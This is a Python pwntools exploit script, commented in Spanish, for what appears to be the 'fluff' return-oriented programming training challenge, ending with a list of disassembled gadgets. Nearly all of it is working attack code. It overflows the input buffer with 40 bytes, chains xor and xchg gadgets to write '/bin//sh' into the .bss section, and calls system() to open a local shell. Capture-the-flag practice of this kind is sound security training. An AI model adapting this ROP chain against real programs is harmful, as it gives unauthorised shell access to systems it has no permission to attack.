from pwn import *

e = ELF('./fluff')
r = process("./fluff")
#gdb.attach(r) #para atachar GDB duh!
#copiar la bss address a r12
rop = p64(0x0000000000400832) #pop r12; mov r13d, 0x604060; ret; 
rop += p64(0x601060) #bss a r12 (pop)
#poner en cero r11
rop += p64(0x0000000000400820) #xor x11 x11
rop += "DPLADPLA" #pop r15
rop += "DPLADPLA" #pop r14
#xor moviendo r12 a r11 con xor
rop += p64(0x000000000040082d)
rop += "DPLADPLA" #pop r14
rop += "DPLADPLA" #pop a r12
#xchg cambiando r11 con r10
rop += p64(0x000000000040083b) 
rop += "DPLADPLA" #pop a r15
#bss queda en r10
#comenzaomos a escribinr binsh
#binsh a r12
rop += p64(0x0000000000400832) #pop r12; mov r13d, 0x604060; ret;
rop += "/bin//sh" #string de /bin/sh pop a r12
#r11 a cero
rop += p64(0x0000000000400820) #xor x11 x11
rop += "DPLADPLA" #pop r15
rop += "DPLADPLA" #pop r14
#r12 a r11
#xor moviendo r12 a r11 con xor
rop += p64(0x000000000040082d)
rop += "DPLADPLA" #pop r14
rop += p64(0x0000000000000000) #pop a r12
#move
rop += p64(0x000000000040084c)#move debo volver r12 a cero antes
rop += "DPLADPLA" #pop r15
rop += "DPLADPLA" #pop r13
rop += p64(0x0000000000000000) #pop r12 para el xor y que no cambie

#system
rop += p64(0x00000000004008c3)#pop rdi; ret;
rop += p64(0x601060)
rop += p64(e.symbols['system']) #magia de pwntools

payload = "A" * 40
payload += rop
r.sendlineafter(">", payload)
r.interactive()


#gadgets

#r11 a cero
#0x0000000000400820 <+0>:     pop    r15
#0x0000000000400822 <+2>:     xor    r11,r11
#0x0000000000400825 <+5>:     pop    r14
#0x0000000000400827 <+7>:     mov    edi,0x601050
#0x000000000040082c <+12>:    ret    
#xor r11 r12
#0x000000000040082d <+13>:    pop    r14
#0x000000000040082f <+15>:    xor    r11,r12
#0x0000000000400832 <+18>:    pop    r12
#0x0000000000400834 <+20>:    mov    r13d,0x604060
#0x000000000040083a <+26>:    ret    
#xchg r11, r10
#0x000000000040083b <+27>:    mov    edi,0x601050
#0x0000000000400840 <+32>:    xchg   r11,r10
#0x0000000000400843 <+35>:    pop    r15
#0x0000000000400845 <+37>:    mov    r11d,0x602050
#0x000000000040084b <+43>:    ret    
#mueve lo que contiene r11 a r12
#0x000000000040084c <+44>:    pop    r15
#0x000000000040084e <+46>:    mov    QWORD PTR [r10],r11
#0x0000000000400851 <+49>:    pop    r13
#0x0000000000400853 <+51>:    pop    r12
#0x0000000000400855 <+53>:    xor    BYTE PTR [r10],r12b
#0x0000000000400858 <+56>:    ret    

